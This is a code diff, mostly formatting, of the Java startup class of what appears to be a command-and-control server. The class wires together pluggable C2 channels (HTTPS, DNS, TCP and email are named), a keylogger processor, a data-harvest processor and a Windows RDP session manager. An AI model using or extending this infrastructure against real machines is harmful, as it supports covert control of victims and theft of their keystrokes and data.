@@ -40,19 +40,19 @@ public class Runner {
 		}
 
 	}
-	
+
 	private ExecutorService service;
 	private IOManager ioManager;
 	private Properties properties;
 	private KeyloggerProcessor keylogger;
-	
+
 	private List<C2Interface> interfaces = new ArrayList<>();
 	private List<Future<?>> runningServiceFutures = new ArrayList<>();
-	
+
 	private CountDownLatch startupLatch = new CountDownLatch(1);
-	
+
 	private HarvestProcessor harvester;
-	
+
 	public void awaitFullStartup() {
 		try {
 			startupLatch.await();
@@ -60,11 +60,11 @@ public class Runner {
 			// meh, don't worry about it
 		}
 	}
-	
+
 	private void initializeCommServices() {
 		String serviceListString = properties.getProperty(Constants.COMMSERVICES);
 		String[] serviceClassNames = serviceListString.split(",");
-		for(String className : serviceClassNames) {
+		for (String className : serviceClassNames) {
 			try {
 				Class<?> c = Class.forName(className);
 				Constructor<?> cons = c.getConstructor();
@@ -72,87 +72,90 @@ public class Runner {
 				C2Interface newModule = (C2Interface) object;
 				engageInterface(newModule);
 				interfaces.add(newModule);
-			}catch(Exception ex) {
+			} catch (Exception ex) {
 				System.out.println("Unable to load class: " + className);
 				ex.printStackTrace();
 			}
 		}
-		
+
 	}
-	
+
 	private void notifyAllServicesForShutdown() {
-		for(C2Interface in : interfaces) {
+		for (C2Interface in : interfaces) {
 			in.notifyPendingShutdown();
 		}
 	}
-	
+
 	private void shutdownAllServices() {
-		for(C2Interface in : interfaces) {
+		for (C2Interface in : interfaces) {
 			in.stop();
 			System.out.println("Shutting down service: " + in.getName());
 		}
 	}
-	
+
 	public void engage(Properties properties) {
 		this.properties = properties;
-		
-		//Set up dynamic constants
+
+		// Set up dynamic constants
 		Constants theOnlyOne = Constants.getConstants();
 		theOnlyOne.setMaxResponseWait(Integer.parseInt(properties.getProperty(Constants.DAEMONMAXRESPONSEWAIT)));
-		theOnlyOne.setRepollForResponseInterval(Integer.parseInt(properties.getProperty(Constants.DAEMONRESPONSEREPOLLINTERVAL)));
-		theOnlyOne.setTextOverTCPStaticWait(Integer.parseInt(properties.getProperty(Constants.DAEMONTEXTOVERTCPSTATICWAIT)));
+		theOnlyOne.setRepollForResponseInterval(
+				Integer.parseInt(properties.getProperty(Constants.DAEMONRESPONSEREPOLLINTERVAL)));
+		theOnlyOne.setTextOverTCPStaticWait(
+				Integer.parseInt(properties.getProperty(Constants.DAEMONTEXTOVERTCPSTATICWAIT)));
 
 		int listenPort = Integer.parseInt(properties.getProperty(Constants.COMMANDERPORT));
 		System.out.println("Listening for instructions on: " + listenPort);
 		service = Executors.newCachedThreadPool();
-		
+
 		CommandLoader cl;
 		try {
 			cl = new CommandLoadParser().buildLoader(properties.getProperty(Constants.HUBCMDDEFAULTS));
 		} catch (Exception e) {
-			System.out.println("Unable to start with specified defaults file: " + properties.getProperty(Constants.HUBCMDDEFAULTS));
+			System.out.println("Unable to start with specified defaults file: "
+					+ properties.getProperty(Constants.HUBCMDDEFAULTS));
 			cl = new CommandLoader(new HashMap<>(), new HashMap<>(), new ArrayList<>());
 		}
-		
+
 		ioManager = new IOManager(Paths.get(properties.getProperty(Constants.HUBLOGGINGPATH)), cl);
-	
+
 		keylogger = new KeyloggerProcessor();
 		keylogger.initialize(properties.getProperty(Constants.DAEMONLZLOGGER));
-		
+
 		harvester = new HarvestProcessor(properties.getProperty(Constants.DAEMONLZHARVEST));
-		
-		//TODO make configurable
-		WindowsRDPManager winManager = new WindowsRDPManager(ioManager, 40000, 15);
+
+		// TODO make configurable
+		WindowsRDPManager winManager = new WindowsRDPManager(ioManager, 40000, 15, ioManager.getCommandPreprocessor());
 		try {
 			winManager.startup();
 		} catch (Exception e) {
 			System.out.println("Unable to load prior Windows RDP information: " + e.getLocalizedMessage());
 		}
-		CommandMacroManager cmm = new CommandMacroManager(winManager, ioManager, properties.getProperty(Constants.DAEMONLZHARVEST));
+		CommandMacroManager cmm = new CommandMacroManager(winManager, ioManager,
+				properties.getProperty(Constants.DAEMONLZHARVEST));
 		cmm.initializeMacros(properties);
-		
+
 		SessionManager sessionManager = new SessionManager(ioManager, listenPort, cmm);
-		
+
 		Future<?> session = service.submit(sessionManager);
-		
+
 		initializeCommServices();
-		
+
 		startupLatch.countDown();
-		
+
 		// Wait forever on these tasks
 		try {
 			session.get();
-			for(Future<?> future : runningServiceFutures) {
+			for (Future<?> future : runningServiceFutures) {
 				future.get();
 			}
 		} catch (InterruptedException ex) {
 			notifyAllServicesForShutdown();
 			/*
-			httpManager.notifyPendingShutdown();
-			dnsEndpointEmulator.notifyPendingShutdown();
-			tcp.notifyPendingShutdown();
-			emailHandler.notifyPendingShutdown();
-			*/
+			 * httpManager.notifyPendingShutdown();
+			 * dnsEndpointEmulator.notifyPendingShutdown(); tcp.notifyPendingShutdown();
+			 * emailHandler.notifyPendingShutdown();
+			 */
 			keylogger.stop();
 			System.out.println("Shutting down");
 			service.shutdownNow();
@@ -162,15 +165,11 @@ public class Runner {
 			winManager.teardown();
 			System.out.println("Stopped RDP session manager");
 			/*
-			httpManager.stop();
-			System.out.println("Stopped HTTPS manager");
-			dnsEndpointEmulator.stop();
-			System.out.println("Stopped DNS manager");
-			tcp.stop();
-			System.out.println("Stopped TCP acceptor");
-			emailHandler.stop();
-			System.out.println("Stopped email handler");
-			*/
+			 * httpManager.stop(); System.out.println("Stopped HTTPS manager");
+			 * dnsEndpointEmulator.stop(); System.out.println("Stopped DNS manager");
+			 * tcp.stop(); System.out.println("Stopped TCP acceptor"); emailHandler.stop();
+			 * System.out.println("Stopped email handler");
+			 */
 			shutdownAllServices();
 			System.out.println("Teardown complete, all functions terminated");
 		} catch (Exception ex) {
@@ -178,11 +177,11 @@ public class Runner {
 		}
 
 	}
-	
-	public void engageInterface(C2Interface in){
+
+	public void engageInterface(C2Interface in) {
 		try {
 			in.initialize(ioManager, properties, keylogger, harvester);
-		}catch(Exception ex) {
+		} catch (Exception ex) {
 			System.out.println("Failed to start service: " + in.getName());
 			ex.printStackTrace();
 		}
